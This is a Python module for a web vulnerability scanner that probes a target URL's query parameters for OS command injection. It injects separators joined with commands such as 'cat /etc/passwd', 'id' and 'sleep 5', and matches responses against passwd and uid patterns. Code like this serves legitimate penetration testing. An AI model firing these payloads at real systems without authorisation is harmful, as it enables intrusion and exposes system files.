# modules/vuln_scanner/command_injection.py

"""
Command Injection Scanner
Author: ATHEX BLACK HAT
Team: Wolf Intelligence PK
Version: 1.0.0

Detects OS command injection vulnerabilities through
parameter manipulation and response analysis.
"""

import re
import time
from typing import Dict, List, Any, Optional
from urllib.parse import urlencode, urlparse, parse_qs

import requests
from requests.exceptions import RequestException


class CommandInjectionScanner:
    """
    Command injection vulnerability scanner.
    
    Tests for OS command injection using various
    command separators and payloads.
    """
    
    COMMAND_PAYLOADS = {
        'separators': [
            ';', '|', '||', '&', '&&', '`', '$()',
        ],
        'commands': [
            'id', 'whoami', 'uname -a', 'hostname',
            'ls -la', 'cat /etc/passwd', 'pwd',
            'ping -c 1 127.0.0.1', 'sleep 5',
        ],
    }
    
    COMMAND_OUTPUT_PATTERNS = [
        r'uid=\d+\([^)]+\)',
        r'root:.:0:0:',
        r'Linux\s+\S+\s+[\d.]+',
        r'[d-][rwx-]{9}',
        r'bin\s+daemon\s+sys',
        r'www-data',
    ]
    
    def __init__(
        self,
        target: str,
        config: Optional[Dict[str, Any]] = None
    ):
        """
        Initialize the command injection scanner.
        
        Args:
            target: Target URL
            config: Configuration dictionary
        """
        self.target = target.rstrip('/')
        self.config = config or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        
        self.timeout = self.config.get('timeout', 10)
        self.verify_ssl = self.config.get('verify_ssl', False)
        
        self.vulnerabilities: List[Dict[str, Any]] = []
        self.errors: List[str] = []
    
    def extract_parameters(self, url: str) -> Dict[str, str]:
        """Extract URL parameters."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        param_dict = {}
        for key, values in params.items():
            param_dict[key] = values[0] if values else ''
        
        return param_dict
    
    def test_time_based(self, url: str, parameter: str) -> Optional[Dict[str, Any]]:
        """
        Test for time-based command injection.
        
        Args:
            url: Target URL
            parameter: Parameter name
            
        Returns:
            Dictionary with finding or None
        """
        sleep_commands = ['sleep 5', 'ping -c 5 127.0.0.1']
        
        for command in sleep_commands:
            for separator in self.COMMAND_PAYLOADS['separators'][:3]:
                payload = f"test{separator} {command}"
                
                parsed = urlparse(url)
                base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                params = self.extract_parameters(url)
                params[parameter] = payload
                
                test_url = base_url + '?' + urlencode(params)
                
                try:
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=self.timeout, verify=self.verify_ssl)
                    elapsed = time.time() - start_time
                    
                    if elapsed >= 4.5:
                        return {
                            'url': test_url,
                            'parameter': parameter,
                            'type': 'time_based',
                            'payload': payload,
                            'response_time': f'{elapsed:.2f}s',
                        }
                        
                except RequestException:
                    continue
        
        return None
    
    def test_output_based(self, url: str, parameter: str) -> Optional[Dict[str, Any]]:
        """
        Test for output-based command injection.
        
        Args:
            url: Target URL
            parameter: Parameter name
            
        Returns:
            Dictionary with finding or None
        """
        test_commands = ['id', 'whoami', 'hostname']
        
        for command in test_commands:
            for separator in self.COMMAND_PAYLOADS['separators'][:3]:
                payload = f"test{separator} {command}"
                
                parsed = urlparse(url)
                base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                params = self.extract_parameters(url)
                params[parameter] = payload
                
                test_url = base_url + '?' + urlencode(params)
                
                try:
                    response = self.session.get(test_url, timeout=self.timeout, verify=self.verify_ssl)
                    
                    for pattern in self.COMMAND_OUTPUT_PATTERNS:
                        if re.search(pattern, response.text):
                            return {
                                'url': test_url,
                                'parameter': parameter,
                                'type': 'output_based',
                                'payload': payload,
                                'pattern_matched': pattern,
                            }
                            
                except RequestException:
                    continue
        
        return None
    
    def run(self) -> Dict[str, Any]:
        """
        Run command injection scan.
        
        Returns:
            Dictionary with scan results
        """
        params = self.extract_parameters(self.target)
        
        for param_name in params:
            time_result = self.test_time_based(self.target, param_name)
            
            if time_result:
                self.vulnerabilities.append(time_result)
                continue
            
            output_result = self.test_output_based(self.target, param_name)
            
            if output_result:
                self.vulnerabilities.append(output_result)
        
        findings = []
        
        for vuln in self.vulnerabilities:
            findings.append({
                'type': f'Command Injection ({vuln["type"]})',
                'severity': 'critical',
                'endpoint': vuln['url'],
                'parameter': vuln['parameter'],
                'description': f"Command injection detected via {vuln['type']} in parameter '{vuln['parameter']}'",
                'evidence': vuln,
                'remediation': 'Avoid system calls. Use parameterized APIs. Validate and sanitize all user input.',
            })
        
        return {
            'findings': findings,
            'errors': self.errors,
            'vulnerabilities_found': len(findings),
        }